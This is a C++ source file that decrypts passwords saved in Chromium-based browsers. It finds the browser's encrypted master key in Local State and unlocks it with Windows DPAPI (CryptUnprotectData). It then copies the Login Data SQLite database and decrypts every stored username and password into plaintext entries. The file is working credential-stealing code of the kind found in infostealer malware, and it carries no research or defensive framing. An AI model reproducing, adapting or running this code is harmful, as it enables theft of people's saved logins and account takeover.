#include "chromium.hpp"

std::vector<chromium::login_entry> chromium::get_logins(const chromium::Browser &browser)
{
    std::vector<chromium::login_entry> entries;

    if (std::filesystem::exists(chromium::paths.at(browser).local_state)) {
        std::string encryption_key = chromium::master_key(browser);

        if (chromium::decrypt_key(encryption_key)) {
            std::string path = chromium::clone_database(chromium::paths.at(browser).login_data);
            if (path.empty()) return entries;

            sqlite3* db;
            sqlite3_stmt* stmt;
            int rc;

            rc = sqlite3_open(path.c_str(), &db);
            rc = sqlite3_prepare(db, "SELECT IFNULL(origin_url, action_url), username_value, password_value FROM logins", -1, &stmt, 0);
            rc = sqlite3_step(stmt);

            while (rc == SQLITE_ROW) {
                std::string url((const char*)sqlite3_column_text(stmt, 0));
                std::string username((const char*)sqlite3_column_text(stmt, 1));

                std::size_t size = sqlite3_column_bytes(stmt, 2);
                std::vector<unsigned char> buffer(size);
                memcpy_s(buffer.data(), buffer.size(), sqlite3_column_blob(stmt, 2), buffer.size());

                std::vector<unsigned char> decrypted_password = crypto::v80_decrypt(encryption_key, buffer);
                std::string password = std::string(decrypted_password.begin(), decrypted_password.end());

                chromium::login_entry entry{ url, username, password };
                entries.push_back(entry);

                rc = sqlite3_step(stmt);
            }
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            std::remove(path.c_str());
        }
    }

    return entries;
}

std::string chromium::clone_database(const std::string &path)
{
    std::ifstream f(path, std::ios::in | std::ios::binary | std::ios::ate);
    if (f.is_open()) {
        std::streamsize size = f.tellg();
        std::vector<char> buffer(size);
        f.seekg(0, std::ios::beg);

        if (f.read(buffer.data(), size)) {
            std::string tmp_path = std::tmpnam(NULL);
            std::ofstream tmp(tmp_path, std::ios::binary);
            if (tmp) {
                tmp.write(buffer.data(), buffer.size());
                return tmp_path;
            }
        }
    }
    return std::string();
}

std::string chromium::master_key(const chromium::Browser &browser)
{
    const std::string path = chromium::paths.at(browser).local_state;
    std::string tmp_path = chromium::clone_database(path);

    std::ifstream f(tmp_path, std::ios::in | std::ios::binary | std::ios::ate);
    std::string key;

    if (f.is_open()) {
        std::streamsize size = f.tellg();
        std::vector<char> _buffer(size);
        std::string buffer(_buffer.begin(), _buffer.end());
        f.seekg(0, std::ios::beg);

        if (f.read(buffer.data(), size)) {
            std::string target("\"encrypted_key\":\"");
            std::size_t index = buffer.find(target);
            std::size_t start = index + target.size();
            std::size_t end = buffer.find("\"", start);
            key = buffer.substr(start, end - start);
        }
        f.close();
    }
    std::remove(tmp_path.c_str());
    return key;
}

bool chromium::decrypt_key(std::string &key)
{
    std::string decoded_key = crypto::base64_decode(key);
    decoded_key = decoded_key.substr(5);

    DATA_BLOB encrypted_key, decrypted_key;
    encrypted_key.cbData = decoded_key.size();
    encrypted_key.pbData = (BYTE*)(decoded_key.c_str());

    if(CryptUnprotectData(&encrypted_key, NULL, NULL, NULL, NULL, 0, &decrypted_key)) {
        key = std::string(reinterpret_cast<const char*>(decrypted_key.pbData));
        return true;
    }
    return false;
}